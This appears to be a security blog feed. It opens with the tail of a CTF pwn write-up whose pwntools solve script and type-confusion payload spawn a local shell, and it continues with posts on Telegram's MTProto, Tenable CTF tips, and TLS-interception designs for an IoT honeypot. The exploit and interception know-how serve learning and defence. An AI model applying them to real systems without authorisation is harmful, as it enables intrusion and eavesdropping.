+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$objdump -M intel -d ./confusing
+...
+
+0000000000001250 &amp;lt;main&amp;gt;:
+...
+    1254:       55                      push   rbp
+    1255:       48 89 e5                mov    rbp,rsp
+    1258:       48 83 ec 20             sub    rsp,0x20
+...
+    1286:       48 8d 45 e2             lea    rax,[rbp-0x1e]
+...
+    12f0:       83 7d e4 ff             cmp    DWORD PTR [rbp-0x1c],0xffffffff
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s go back to the payload from earlier: &lt;em&gt;0x1934909090909090&lt;/em&gt;. If we can manipulate four bytes after &lt;em&gt;1934&lt;/em&gt;, we can effectively set &lt;em&gt;z&lt;/em&gt;. With that in mind, let’s set those four bytes to &lt;em&gt;0xff&lt;/em&gt;, the bytes equivalent of -1 for signed values.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; struct.unpack(&apos;d&apos;, p16(13337) + b&apos;\xff\xff\xff\xff\x90\x90&apos;)
+(-7.007969861245233e-229,)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then run it in the test application:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo &apos;-7.007969861245233e-229&apos; | ./a.out
+Value of z:  ffffffff  -1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, we have set all four variables.&lt;/p&gt;
+
+&lt;p&gt;The official solution sets &lt;em&gt;z&lt;/em&gt; in a similar manner. The only difference is the last two bytes—which, again, don’t matter for the solution.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Give me d: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;d&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xff\xff\xff\xff\xfe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;the-official-solution&quot;&gt;The official solution&lt;/h1&gt;
+
+&lt;p&gt;With all of this in mind, it’s a breath of fresh air to read the published answer:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;../publish/confusing&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Give me d: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;d&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xff\xff\xff\xff\xfe&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Give me s: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;FLAG&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Give me f: &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;d&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.6180339887&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To test it, we can target the local binary. Make sure to change the path of the process target.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python3 confusing.py
+[+] Starting local process &apos;./confusing&apos;: pid 725828
+[*] Switching to interactive mode
+$ whoami
+kali
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">This walkthrough will analyze the confusing challenge from Down Under CTF 2023. This approach will take “the hard way,” opting to analyze the lower-level details behind the official solution to the challenge. The intention is to provide a methodology behind the answer, to explain the low-level details behind each problem, and to explain Python’s pwntools and struct packages a little more in depth.</summary></entry><entry><title type="html">Revisiting Telegram’s Security Protocol (MTProto)</title><link href="http://localhost:4000/2022/12/10/revisiting-telegrams-security-protocol-mtproto.html" rel="alternate" type="text/html" title="Revisiting Telegram’s Security Protocol (MTProto)" /><published>2022-12-10T00:00:00-05:00</published><updated>2022-12-10T00:00:00-05:00</updated><id>http://localhost:4000/2022/12/10/revisiting-telegrams-security-protocol-mtproto</id><content type="html" xml:base="http://localhost:4000/2022/12/10/revisiting-telegrams-security-protocol-mtproto.html">&lt;p&gt;Telegram has some issues. It is not my preferred messaging app.&lt;/p&gt;
+
+&lt;p&gt;From personal experience, most Telegram users just want an alternative to platforms like Facebook’s Messenger or iMessage. But, also anecdotally, most of its users don’t understand the fundamentals behind its encryption or potential to preserve data confidentiality or integrity.&lt;/p&gt;
+
+&lt;p&gt;Meaning: If you’re a Telegram user, you should research MTProto.&lt;/p&gt;
+
+&lt;p&gt;A little over a year ago, I wrote a paper about Telegram as a whole. The paper was meant to illustrate some security concerns and considerations with the application as a whole, server and clients alike. The findings were largely focused on MTProto2, but it covered a wide breadth of concerns in the application.&lt;/p&gt;
+
+&lt;p&gt;For the record, Telegram has fixed some of the vulnerabilities outlined in that paper. However, the application still defaults to SMS authentication only (which can be defeated by SIM-swapping, where someone calls your phone ISP, requests that your phone number be transferred to their device, and can recieve your SMS messages and SMS codes). It also reveals your phone number by default. Also, you &lt;em&gt;must&lt;/em&gt; register a phone number to use the service.&lt;/p&gt;
+
+&lt;p&gt;This follow-up is going to forego those caveats. If you have concerns, you can just try the app or ask a friend. Instead, this discussion will focus only on the encryption protocol.&lt;/p&gt;
+
+&lt;p&gt;In general, MTProto and MTProto2 have faced a lot of backlash from security researchers. Here are some timeless reasons why:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The protocol is homegrown. Homemade protocols are generally not recommended unless they have undergone extensive security testing.&lt;/li&gt;
+  &lt;li&gt;The protocol is based on other encryption protocols, like hashing and asymmetric encryption, as its “building blocks.” This reduces the protocol’s security to the security of these building blocks.&lt;/li&gt;
+  &lt;li&gt;The protocol only enforces end-to-end encryption for “secret chats.” Not only are these not the default, but they are also not available for group chats.&lt;/li&gt;
+  &lt;li&gt;For non-secret chats, message encryption is undermined in the server. In transit, the message is encrypted and sent to the servers. There, it is decrypted in plaintext, and re-encrypted with the database’s key. (That process reverses when the message is sent to the recipient.) The idea that it is decrpyted at all in the server undermines the protections offered by encryption in the first place.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;None of these reasons have really changed over time. Secret chats are new, but they are very limited in capabilities compared to regular (non-end-to-end encrypted) and group chats.&lt;/p&gt;
+
+&lt;p&gt;The notion that the protocol itself allows messages to be decrypted in the server is, and always has been, pause for concern. This places undue trust on the server, which is closed-source. You never really know what happens on its servers.&lt;/p&gt;
+
+&lt;p&gt;Albrecht et al. observe that MTProto will protect the integrity of plaintext data, but does nothing to protect the integrity of ciphertext (encrypted data). This implies that the protocol will always need to decrypt the data before it can determine if anything was tampered. This is considered less reliable than schemes that protect the ciphertext integrity. (It doesn’t make sense to me why you would protect the plaintext instead of the ciphertext because valid ciphertext will decrypt to valid plaintext anyway.)&lt;/p&gt;
+
+&lt;p&gt;They also observe that client-side security can find itself at risk if a third-party Telegram client is not performing robust security testing on their custom client. This makes the security of any third-party Telegram client ambiguous.&lt;/p&gt;
+
+&lt;p&gt;My biggest issue with Telegram is that it’s advertised in a way that does not match its implementation. Many users expect that it preserves privacy and security for all chats. Their exepctation better reflects how secret chats work; and this, as noted, is not true of default or group chats.&lt;/p&gt;
+
+&lt;p&gt;If Telegram ever wanted to sell user data or metadata, they have every opportunity because the plaintext messages are right there in their servers. The organization says takes a stance in favor of user privacy. So, now you’re left trusting the company.&lt;/p&gt;
+
+&lt;p&gt;People often compare Telegram to Signal with respect to its security. I argue that there is no comparison because Signal will end-to-end encrypt every chat, including group chats.&lt;/p&gt;
+
+&lt;p&gt;Telegram often gets attention because it has more features than Signal. However, the Telegram’s “secret chats” lack many features that are available to its own default and group chats. In fact, secret chats in Telegram look a lot like, well, every chat in Telegram—except, of course, Telegram’s secret chats have limited features comapred to any chat type in Signal.&lt;/p&gt;
+
+&lt;p&gt;People will certainly continue to use platforms like Telegram. If you like Telegram, you should use it. Just use it with a better understanding of &lt;em&gt;what&lt;/em&gt; you are using: what it is and, as important, is &lt;em&gt;not&lt;/em&gt; doing.&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+
+&lt;p&gt;https://mtpsym.github.io/&lt;/p&gt;
+
+&lt;p&gt;https://core.telegram.org/api/end-to-end&lt;/p&gt;
+
+&lt;p&gt;https://www.wired.com/story/telegram-encryption-whatsapp-settings&lt;/p&gt;
+
+&lt;p&gt;https://www.kaspersky.com/blog/telegram-privacy-security/38444/&lt;/p&gt;
+
+&lt;p&gt;https://medium.com/@justinomora/demystifying-the-signal-protocol-for-end-to-end-encryption-e2ee-ad6a567e6cb4&lt;/p&gt;</content><author><name></name></author><summary type="html">Telegram has some issues. It is not my preferred messaging app.</summary></entry><entry><title type="html">Reflections on Tenable’s CTF (2022)</title><link href="http://localhost:4000/2022/06/26/reflections-on-tenable-ctf.html" rel="alternate" type="text/html" title="Reflections on Tenable’s CTF (2022)" /><published>2022-06-26T00:00:00-04:00</published><updated>2022-06-26T00:00:00-04:00</updated><id>http://localhost:4000/2022/06/26/reflections-on-tenable-ctf</id><content type="html" xml:base="http://localhost:4000/2022/06/26/reflections-on-tenable-ctf.html">&lt;p&gt;Tenable sponsored a CTF this month; I learned about it 12 hours after it started, but was able to assemble a team and compete. My team scored 800 points total; this landed us in 361st place (out of 1357 teams total). Of the 800 points, I scored 500 myself: successfully completing 5 challenges.&lt;/p&gt;
+
+&lt;p&gt;Write-ups have already been published, and many of them go very in-depth. Here is a quick overview of some strategies that I used in order to complete the challenges:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;300 points&lt;/strong&gt;. Three challenges were based on basic web security. You can use Burp Suite in order to see the flags, in cleartext, in each response.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;100 points&lt;/strong&gt;. One forensics challenge required you to “de-obfuscate” a redaction on a PDF document. To complete this challenge, and find the flag, I used &lt;strong&gt;PeePDF&lt;/strong&gt; to analyze the PDF stream data and find the flag. (More about this tool later.) Object 24 contains a base64 string. Decode this to reveal a PNG file, which contains the flag.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;100 points&lt;/strong&gt;. Another forensics challenge hid the flag inside a PCAP file. Open this in Wireshark and follow the Modbus stream. The flag is right there, but with strange characters delimiting it. Remove the characters to reveal the flag’s string.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Here are some reflections:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;With any kind of application-security challenges, my recommendation is to use the in-built browser that Burp Suite provides. This will consolidate your workspace and free up your favorite browser.&lt;/li&gt;
+  &lt;li&gt;PeePDF is written for Python2. Peepdf is also no longer available as a Kali package. My recommendation is to install Python2, clone the official PeePDF repo, and use the Python2 runtime to actually use this tool (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python2 peepdf.py&lt;/code&gt;, for example). You can install Python2 separately from your default python. (Side note: Hexdump is not very helpful for analyzing PDFs because PDFS use compression, which changes the decoding, and obfuscates a simple search result.)&lt;/li&gt;
+  &lt;li&gt;Wireshark and Netminer are great forensics tools for analyzing PCAP files. In this case, Netminer did not provide any results for this challenge, but it is very helpful to enumerate credentials and files. (You can enumerate credentials and files from Wireshark, but it requires more effort.)&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">Tenable sponsored a CTF this month; I learned about it 12 hours after it started, but was able to assemble a team and compete. My team scored 800 points total; this landed us in 361st place (out of 1357 teams total). Of the 800 points, I scored 500 myself: successfully completing 5 challenges.</summary></entry><entry><title type="html">Circumventing TLS</title><link href="http://localhost:4000/2022/06/26/circumventing-tls.html" rel="alternate" type="text/html" title="Circumventing TLS" /><published>2022-06-26T00:00:00-04:00</published><updated>2022-06-26T00:00:00-04:00</updated><id>http://localhost:4000/2022/06/26/circumventing-tls</id><content type="html" xml:base="http://localhost:4000/2022/06/26/circumventing-tls.html">&lt;h1 id=&quot;scope-and-purpose&quot;&gt;Scope and Purpose&lt;/h1&gt;
+
+&lt;p&gt;This document provides two methods and three
+architectures which would facilitate HTTPS traffic interception: getting
+request and response data in cleartext. All approaches assume that
+strong TLS is used and cannot be fundamentally broken. Further, it
+assumes that the IoT devices themselves cannot be modified, nor can
+their firmware be dumped. (Note: The mitm interceptors will work better
+if a device’s private key and certificate are exfiltrated, but this is
+not strictly needed because all devices are behind the same subnet.)&lt;/p&gt;
+
+&lt;p&gt;This should provide the decrypted request-response
+pairs, which a PCAP file will not necessarily allow you to retrieve from
+captured TLS packets. That is not to undermine the use of something like
+tcpdump on a central gateway. Rather, the “methods to decrypt” should
+complement such a solution, with the intention of yielding plaintext TLS
+traffic.&lt;/p&gt;
+
+&lt;h1 id=&quot;methods-to-decrypt&quot;&gt;Methods to decrypt&lt;/h1&gt;
+
+&lt;p&gt;With TLS 1.3, there are two primary approaches to circumventing TLS in
+order to transparently intercept traffic. Both methods are explained in three
+different architectures in the next section. Neither method touches on
+traffic analysis. This is best accomplished using machine learning. Such
+a discussion is out of scope.&lt;/p&gt;
+
+&lt;h2 id=&quot;capturing-session-keys&quot;&gt;Capturing Session Keys&lt;/h2&gt;
+
+&lt;p&gt;Tools like SSLKeyLogger can
+capture session keys at the endpoint itself. This is designed for client
+applications. However, the shared object can hook into services and dump
+session keys for a web service.&lt;/p&gt;
+
+&lt;p&gt;The source code for the shared object is located here: https://git.lekensteyn.nl/peter/wireshark-notes.&lt;/p&gt;
+
+&lt;p&gt;A walkthrough for hooking into an Apache2 web service is explained here:
+https://security.stackexchange.com/a/215397&lt;/p&gt;
+
+&lt;h2 id=&quot;leveraging-a-transparent-interceptor&quot;&gt;Leveraging a transparent “interceptor”&lt;/h2&gt;
+
+&lt;p&gt;An application that decrypts-and-forwards packets can
+sit between an endpoint and some other network. The next section in this
+document discusses two approaches to realize this goal (Architectures 2
+and 3).&lt;/p&gt;
+
+&lt;p&gt;An oversimplified application architecture might
+resemble the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-26/interceptor-architecture.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This should work for an IoT device that is under your
+own control. Consider that, if this sat between an attacker and, say,
+Google.com, the certificate mis-match would raise an alert in the
+attacker’s browser. However, since the device is on your own subnet,
+this should work transparently.&lt;/p&gt;
+
+&lt;p&gt;Finally, consider that “IoT device” can include a
+“smart device” or an IoT hub. The use of hubs is becoming increasingly
+popular in home IoT environments.&lt;/p&gt;
+
+&lt;p&gt;Note: The security and accessibility benefits
+should be obvious and are not noted here at this time. Likewise, the
+security and implementation concerns are also obvious and are also not
+noted here at this time. Suffice it to say, an IoT hub would make a
+great target for an attacker if it were poorly configured, designed, or
+implemented.&lt;/p&gt;
+
+&lt;h3 id=&quot;other-implementation-ideas&quot;&gt;Other implementation ideas&lt;/h3&gt;
+
+&lt;p&gt;A node on the network might accomplish the same goal by
+using something like PolarProxy or mitmproxy. Please note that these
+tools will require extensive configuration. It may prove easier to write
+something from scratch.&lt;/p&gt;
+
+&lt;h1 id=&quot;attack-surface-architectures&quot;&gt;Attack Surface Architectures&lt;/h1&gt;
+
+&lt;p&gt;This document assumes that an approved entity is capturing HTTPS traffic
+on a network with N number of
+IoT devices. The following architectures will create the conditions
+needed for transparent HTTPS encryption and decryption. They are all
+transparent to the attacker and require no client-side
+configuration.&lt;/p&gt;
+
+&lt;p&gt;Architectures 1 and 2 show how the attacker might
+leverage an IoT hub to attack devices behind the hub. They assume that
+the attacker is connecting to the Hub on port 443, the only open port on
+the gateway/router. This architecture best represents an “ideal” IoT
+home, whereby an authorized entity can access their IoT devices through
+a hub, which listens on port 443, the only WAN-facing port.&lt;/p&gt;
+
+&lt;p&gt;Architecture 3 will faithfully capture
+requests/responses as close as possible to the endpoint (the IoT device
+itself). This setup assumes that the attacker is on the subnet and can
+attack each IoT endpoint “directly” (through the node that is
+intercepting and logging request-response pairs). This architecture best
+represents how an attacker who has infiltrated the network might try to
+attack the devices.&lt;/p&gt;
+
+&lt;p&gt;Finally, it may serve the user to combine architectures
+2 and 3. This will provide a comprehensive amount of request-response
+data. However, this will require more routing and subnetting, and may
+introduce unwanted overhead.&lt;/p&gt;
+
+&lt;h2 id=&quot;architecture-1-intercept-on-the-iot-hub&quot;&gt;Architecture 1: Intercept on the IoT hub&lt;/h2&gt;
+
+&lt;p&gt;If the IoT hub is open-source or home-grown, a developer could hook the
+SSLKeyLog shared object into the Hub’s service. This can intercept the
+session keys for streams between the WAN and the HUB, as well as all
+streams from the HUB to N number of IoT devices.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-26/architecture1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pros: This best resembles the
+current direction of IoT security and device relationships. Consolidates
+the number of open ports facing the WAN. You can plug the session keys
+into a corresponding PCAP file with the TLS traffic and view the
+cleartext request-response data in an application like Wireshark.&lt;/p&gt;
+
+&lt;p&gt;Cons: If you can neither hook
+the SSLKeyLog.so nor extract the pk/cert , this solution is
+infeasible.&lt;/p&gt;
+
+&lt;h2 id=&quot;architecture-2-mitm-just-before-the-hub&quot;&gt;Architecture 2: MitM just before the Hub.&lt;/h2&gt;
+
+&lt;p&gt;If you cannot install or hook SSLKeyLogger on the hub,
+you can set up a listener to transparently intercept and log
+request-response pairs. Such an application works like a mitm proxy, but
+MUST be fully transparent to the WAN; notably, it MUST NOT require the
+client to perform any kind of browser configuration.&lt;/p&gt;
+
+&lt;p&gt;This model assumes you have the hub’s private key and certificate. If
+this is infeasible, the intercepting application MUST be engineered in
+such a way that it does not reveal (to the attacker) that it is using a different private
+key than the hub itself. Understand that this is integral to TLS; it is
+essentially what prevents this kind of interception from happening
+between a user and a site like Google.com.&lt;/p&gt;
+
+&lt;p&gt;With that said, an engineer whose devices are on their
+own subnet can pull this off. Just use thorough and common-sense testing
+to ensure that an attacker cannot detect that there is a node capturing
+traffic.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-26/architecture2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pros: Transparently capture the
+request and response pairs between the WAN and Hub. Since the hub will
+make requests to the devices on behalf of the user/attacker, you can
+determine how the attacker intends to exploit the IoT device and the
+hub. This is best for a system that employs a hub, which allows no
+access to or control over the hub’s firmware.&lt;/p&gt;
+
+&lt;p&gt;Cons: Will not provide data on
+how the attacker would directly attack the IoT device itself, because
+the hub sits between the attacker and the device. This is problematic in
+the event that an attacker infiltrates the private network: a given
+assumption in zero-trust architectures.&lt;/p&gt;
+
+&lt;h2 id=&quot;architecture-3-capture-just-before-the-endpoint&quot;&gt;Architecture 3: Capture just before the endpoint&lt;/h2&gt;
+
+&lt;p&gt;This architecture will set up a listener just before
+each endpoint. The interceptor is another node on the network.
+Authorized and unauthorized entities alike must pass through this node
+in order to contact the IoT device itself. (On a honeypot, all entities
+are unauthorized.)&lt;/p&gt;
+
+&lt;p&gt;This will yield the most accurate representation of how
+an attacker, or malware like Mirai, might try to exploit HTTPS on an IoT
+device. The biggest downside is that it requires the private key and
+certificate for the IoT device; if the developer cannot get this, the
+interception is not possible. Further, each IoT device will require a
+separate node (for example, a docker container, VM, or physical device
+like a Raspberry Pi); this will understandably introduce
+overhead.&lt;/p&gt;
+
+&lt;p&gt;Note that, if the attacker has full control over the
+IoT device, they can leverage SSLKeyLogger to dump the session keys on
+the endpoint itself. Of course, since many IoT devices use small,
+proprietary firmware, this is likely infeasible. A workaround is to
+create the IoT device from scratch: for example, using a RaspberryPi,
+known endpoints and behaviors, and historic, captured traffic to the
+real IoT device which this one is imitating.&lt;/p&gt;
+
+&lt;p&gt;One massive caveat with this approach is that many IoT vendors are
+leveraging private keys and certificates in their device endpoint and in the phone application itself.
+If this is the case, the only workaround is to break TLS. With that
+said, understand that the attacker may not be able to launch an attack
+with any means beside the authorized, legitimate app. So, such devices
+may be less susceptible to tactics and procedures which are commonly
+used against web applications (for example, using Burp Suite).&lt;/p&gt;
+
+&lt;p&gt;In the following diagram, note that the attacker must
+pass through the interceptor; both clients are on the OpenWRT subnet
+(192.168.1.255). However, the IoT device connects to the interceptor
+directly via some new subnet (10.0.0.255). Implementation details for
+this second subnet are not discussed here. The point is to not make the
+device publicly available to the “real” subnet, while nonetheless having
+the device appear “transparent” to an attacker.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2022-06-26/architecture3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pros: This will yield the most
+accurate data about each device.&lt;/p&gt;
+
+&lt;p&gt;Cons: The additional subnet (10.0.0.M in the diagram) will require
+more configuration and could introduce more overhead.&lt;/p&gt;
+
+&lt;h2 id=&quot;combination-of-architectures-2-and-3&quot;&gt;Combination of Architectures 2 and 3&lt;/h2&gt;
+
+&lt;p&gt;This approach will place a listener between the wan and
+hub, and between the hub and each device.
+If feasible (with respect to time and financial means), the author
+recommends implementing a network like this because it will yield the
+most cleartext data from all TLS requests-responses behind the gateway.&lt;/p&gt;
+
+&lt;p&gt;Pros: Combining architectures 2
+and 3 will yield the most data.&lt;/p&gt;
+
+&lt;p&gt;Cons: This will have the same concerns regarding
+configuration and overhead as noted in Architecture 2. Further, this
+will spoof packets between the device and the hub; if the hub detects
+this, it may cause accessibility issues. (Note:
+Ideally, the interceptor will not have this caveat, but it is still
+worth reiterating.)&lt;/p&gt;
+
+&lt;h1 id=&quot;considerations&quot;&gt;Considerations&lt;/h1&gt;
+
+&lt;p&gt;This document is written with HTTPS in mind. An IoT
+network that relies on non-HTTPS traffic may not benefit from the
+preceding discussion.&lt;/p&gt;
+
+&lt;p&gt;Each “interceptor” node represents a single point of
+failure for communication to and from the device. Scaling, redundancy,
+and similar features are not covered here. Although this document was
+written with FOSS solutions in mind, concerns related to SPOF may
+introduce some cost implications.&lt;/p&gt;
+
+&lt;p&gt;An interceptor that decrypts-then-forwards HTTPS
+traffic must faithfully reconstruct the entire HTTP Request (from the
+attacker) before sending it to the intended endpoint (the IoT device).
+Failure to do so may leave evidence that there is a system between the
+attacker and the device. This would compromise the “transparency”
+aspect.&lt;/p&gt;
+
+&lt;p&gt;As noted (but bears repeating), take care to test
+whether an interceptor’s certificate will raise any alerts in the
+attacker’s browser. An obvious example would arise if you tried to use
+such an interceptor to capture traffic between the
+attacker and, say, Google. The mismatch in keys/certificates would raise
+an alert in the attacker’s browser and thereby compromise transparency
+(in addition to flat-out failing to load content in the browser). Again,
+take special care to test for these differences before opening the lab
+to the WAN.&lt;/p&gt;
+
+&lt;p&gt;Finally, if you just want a comprehensive packet-capture (like in
+tcpdump on a router), try to ways to force HTTP on the IoT devices. As
+HTTPS is becoming more and more popular for low-end devices, this
+solution may prove infeasible as time goes on. Still, if it works right
